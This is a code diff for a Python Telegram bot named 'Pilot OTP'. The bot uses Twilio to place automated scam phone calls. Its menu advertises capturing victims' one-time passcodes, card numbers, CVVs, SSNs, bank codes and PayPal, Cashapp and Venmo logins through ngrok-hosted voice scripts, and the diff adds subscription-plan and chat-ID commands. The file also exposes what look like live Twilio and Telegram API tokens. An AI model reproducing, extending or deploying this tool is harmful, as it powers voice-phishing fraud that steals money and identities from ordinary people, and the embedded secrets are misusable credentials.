@@ -2,6 +2,7 @@ import os
 import telebot
 from twilio.rest import Client
 from telebot import types
+import json
 import requests
 while True:
   try:
@@ -9,7 +10,7 @@ while True:
     callid = None
     auth_token = '27ac8193bae177474d54c0fc4421578c'
     from_number = '+15076691829'
-    status_callback_url = 'https://19b7-100-0-165-141.ngrok.io/call/status'
+    status_callback_url = 'https://ef52-100-0-165-141.ngrok.io/call/status'
     telegram_bot_token = '6096442307:AAEoN0VodeJjvtmwOQzFKBqKQRMBG75wh-M'
     telegram_bot = telebot.TeleBot(telegram_bot_token)
     @telegram_bot.message_handler(commands=['cashapp'])
@@ -38,7 +39,7 @@ while True:
             status_callback=status_callback_url+f"?chanid={message.chat.id}",
             from_=from_number,
             status_callback_event=['Completed'],
-            url=f'https://19b7-100-0-165-141.ngrok.io/voice/cashapp?name={name}&chanid={message.chat.id}'
+            url=f'https://ef52-100-0-165-141.ngrok.io/voice/cashapp?name={name}&chanid={message.chat.id}'
         )
         button_text = "Hangup"
         button_data = f'hangup {call.sid}'
@@ -72,7 +73,7 @@ while True:
             status_callback=status_callback_url+f"?chanid={message.chat.id}",
             from_=from_number,
             status_callback_event=['Completed'],
-            url=f'https://19b7-100-0-165-141.ngrok.io/voice/paypal?name={name}&chanid={message.chat.id}')
+            url=f'https://ef52-100-0-165-141.ngrok.io/voice/paypal?name={name}&chanid={message.chat.id}')
         button_text = "Hangup"
         button_data = f'hangup {call.sid}'
         button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
@@ -104,7 +105,7 @@ while True:
             status_callback=status_callback_url+f"?chanid={message.chat.id}",
             from_=from_number,
             status_callback_event=['Completed'],
-            url=f'https://19b7-100-0-165-141.ngrok.io/voice/venmo?name={name}&chanid={message.chat.id}')
+            url=f'https://ef52-100-0-165-141.ngrok.io/voice/venmo?name={name}&chanid={message.chat.id}')
         button_text = "Hangup"
         button_data = f'hangup {call.sid}'
         button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
@@ -137,7 +138,7 @@ while True:
             status_callback=status_callback_url+f"?chanid={message.chat.id}",
             from_=from_number,
             status_callback_event=['Completed'],
-            url=f'https://19b7-100-0-165-141.ngrok.io/voice/otp?name={name}&chanid={message.chat.id}&bisname={company}&dgt={digt}')
+            url=f'https://ef52-100-0-165-141.ngrok.io/voice/otp?name={name}&chanid={message.chat.id}&bisname={company}&dgt={digt}')
         button_text = "Hangup"
         button_data = f'hangup {call.sid}'
         button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
@@ -169,7 +170,7 @@ while True:
             status_callback=status_callback_url+f"?chanid={message.chat.id}",
             from_=from_number,
             status_callback_event=['Completed'],
-            url=f'https://19b7-100-0-165-141.ngrok.io/voice/bank?name={name}&chanid={message.chat.id}&bank={bank_name}')
+            url=f'https://ef52-100-0-165-141.ngrok.io/voice/bank?name={name}&chanid={message.chat.id}&bank={bank_name}')
         button_text = "Hangup"
         button_data = f'hangup {call.sid}'
         button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
@@ -202,7 +203,7 @@ while True:
             status_callback=status_callback_url+f"?chanid={message.chat.id}",
             from_=from_number,
             status_callback_event=['Completed'],
-            url=f'https://19b7-100-0-165-141.ngrok.io/voice/ssn?name={name}&chanid={message.chat.id}&bank={bank_name}')
+            url=f'https://ef52-100-0-165-141.ngrok.io/voice/ssn?name={name}&chanid={message.chat.id}&bank={bank_name}')
         button_text = "Hangup"
         button_data = f'hangup {call.sid}'
         button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
@@ -220,7 +221,21 @@ while True:
         keyboard = types.InlineKeyboardMarkup().add(button).add(button2)
         message_text = "✈️ Pilot OTP\n\n🤖 Core Commands\n• 📖~ /help | view commands\n• 🎧~/setvoice | set language\n• ⏰~/plan | display your current plan\n\n📱Call Commands\n• 🔐~/otp | Capture OTP\n• 💳~/card | Capture Card Numbers\n• 💳~/cvv | Capture CVV\n• 💳~/vbv | Capture vbv\n• 📅~/date | Capture expiration date\n• 🪪~/ssn | Capture SSN\n• 🎉~/speak | Say any Text\n\n 🔗 Premade Commands\n• 🅿️~/paypal | Capture paypal\n• 💵~/cashapp | Capture Cashapp\n• 🏦~/bank | Capture 6 digit Bank Code\n• 📤~/venmo | Captures Venmo"
         telegram_bot.send_message(chat_id=message.chat.id, text=message_text, reply_markup=keyboard,parse_mode= 'Markdown')
-  
+    @telegram_bot.message_handler(commands=['plan'])
+    def plan_command(message):
+        loadtime = requests.get(f"http://localhost:7300/user_info?username={message.chat.id}")
+        if "error" in loadtime.text:
+            telegram_bot.send_message(chat_id=message.chat.id, text="⏰ Plan\n\n❌Looks like you don't have a plan right now!",parse_mode= 'Markdown')
+            return
+        y = json.loads(loadtime.text)
+        exp=y["expiration_date"]
+        message_text = f"⏰ Plan\n\n🗓️Your account expires at {exp}"
+        telegram_bot.send_message(chat_id=message.chat.id, text=message_text,parse_mode= 'Markdown')
+        return
+    @telegram_bot.message_handler(commands=['myid'])
+    def plan_command(message):
+        telegram_bot.send_message(chat_id=message.chat.id, text=f"🔑ChatID: {message.chat.id}",parse_mode= 'Markdown')
+        return
   #Call back function
     @telegram_bot.callback_query_handler(func=lambda call: True)
     def handle_callback_query(call):
@@ -231,4 +246,4 @@ while True:
                 client.calls(call_sid).update(status='completed')
     telegram_bot.polling()
   except Exception as e: print(e)
-  
+  #http://localhost:7300/user_info?username={message.chat.id}
